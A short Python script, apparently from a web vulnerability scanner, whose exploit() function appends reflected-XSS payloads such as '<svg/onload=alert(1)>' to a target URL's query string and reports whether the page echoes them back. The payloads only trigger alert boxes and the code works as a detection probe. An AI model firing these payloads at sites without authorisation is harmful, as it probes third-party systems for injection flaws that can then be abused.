import requests
from termcolor import cprint

def exploit(url, mode='default'):
    if mode == 'default':
        payload = "<svg/onload=alert(1)>"
        test_url = url if "?" in url else f"{url}?q="
        full_url = test_url + payload

        try:
            r = requests.get(full_url, timeout=10)
            if payload in r.text:
                cprint("[XSS EXPLOIT] Confirmed reflected XSS vulnerability!", "green", attrs=['bold'])
                cprint(f" -> {full_url}", "cyan")
            else:
                cprint("[XSS EXPLOIT] No reflection of payload found.", "yellow")
        except requests.RequestException:
            cprint("[XSS EXPLOIT] Request failed.", "red")

    elif mode == 'new':
        cprint("[XSS EXPLOIT][NEW] Running new exploit routine...", "blue", attrs=['bold'])
        new_payload = "<img src=x onerror=alert('XSS New')>"
        test_url = url if "?" in url else f"{url}?input="
        full_url = test_url + new_payload

        try:
            r = requests.get(full_url, timeout=10)
            if new_payload in r.text:
                cprint("[XSS EXPLOIT][NEW] Confirmed new reflected XSS vulnerability!", "green", attrs=['bold'])
                cprint(f" -> {full_url}", "cyan")
            else:
                cprint("[XSS EXPLOIT][NEW] No reflection of new payload found.", "yellow")
        except requests.RequestException:
            cprint("[XSS EXPLOIT][NEW] Request failed.", "red")

    else:
        cprint(f"[XSS EXPLOIT] Unknown mode '{mode}' specified.", "red")
